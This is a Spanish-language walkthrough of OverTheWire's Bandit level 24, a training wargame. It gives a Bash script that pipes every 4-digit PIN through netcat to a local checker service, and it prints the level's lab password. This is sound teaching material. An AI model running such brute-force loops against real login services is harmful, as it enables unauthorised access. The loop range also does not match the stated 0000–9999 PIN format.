**Wargame:** Bandit
**Platform:** OverTheWire

---
### Objective

Un **daemon** (servicio) está corriendo en el puerto `30002` que nos pide dos cosas: la contraseña actual de `bandit24` y un código PIN de 4 dígitos. Nuestro objetivo es **escribir un script que automatice las pruebas** para descubrir el PIN correcto y obtener la contraseña del siguiente nivel.

---
### Understanding the Challenge

Cuando nos conectamos al puerto `30002` con `nc`, el servicio nos presenta el siguiente mensaje:

```Plain text
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

Esto significa que debemos enviar:

```Plain text
[contraseña_bandit24] [PIN]
```

Si fallamos, el servicio nos indica que el PIN es incorrecto. El PIN es un número de **4 dígitos** (0000 a 9999). Probar manualmente 10,000 combinaciones es inviable, por lo que necesitamos automatizar el proceso.

---
### Enumerating the Service

Primero, confirmamos que el servicio está accesible:

```bash
nc localhost 30002
```

Output:

```Plain text
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

Podemos probar una combinación manual para entender el formato de respuesta:

```bash
echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1234" | nc localhost 30002
```

Output:

```Plain text
Wrong! Please enter the correct current password and pincode. Try again.
```

Cuando acertamos, la respuesta esperada es:

```Plain text
Correct!
The password of user bandit25 is [LA_CONTRASEÑA]
```

---
### The Exploit Strategy

Vamos a crear un script en Bash que:

1. Tome la contraseña de `bandit24` como variable
    
2. Itere sobre todos los números del 0000 al 9999
    
3. Para cada número, envíe `[password] [pin]` al servicio
    
4. Filtre la respuesta para detectar cuándo acertamos
    
5. Nos muestre únicamente la línea con la contraseña

---
### Creating the Brute-Force Script

Necesitamos un lugar para trabajar, por ejemplo en `/tmp`:

```bash
cd /tmp
mkdir pin_bruteforce
cd pin_bruteforce
```

Creamos nuestro script:

```bash
nano brute_pin.sh
```

Contenido del script:

```bash
#!/bin/bash

PASSWORD="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for i in {0..10000}; do
    echo "$PASSWORD $i" | nc localhost 30002 | grep -v "Wrong! Please enter the correct current password and pincode. Try again."
done
```

Damos permisos de ejecución: 

```bash
chmod +x brute_pin.sh
```

---
### running the script

Ejecutamos el script:

```bash
./brute_pin.sh
```

El script comenzará a probar combinaciones. Inicialmente veremos muchas líneas vacías (porque filtramos los mensajes de error). Cuando encuentre el PIN correcto, veremos algo como:

```Plain text
Correct!
The password of user bandit25 is [REDACTED]
```

---
### Retrieved Password

El valor que aparece después de "The password of user bandit25 is" es **la contraseña para Bandit Level 25.**

---
### Skills Practiced

- **Fuerza bruta** automatizada con Bash
- Uso de **bucles `for`** para iterar sobre rangos numéricos
- **Netcat** como cliente para interactuar con servicios de red
- **Filtrado de output** con `grep -v`
- Interacción con **servicios (daemons)** en puertos específicos

---
### screenshots
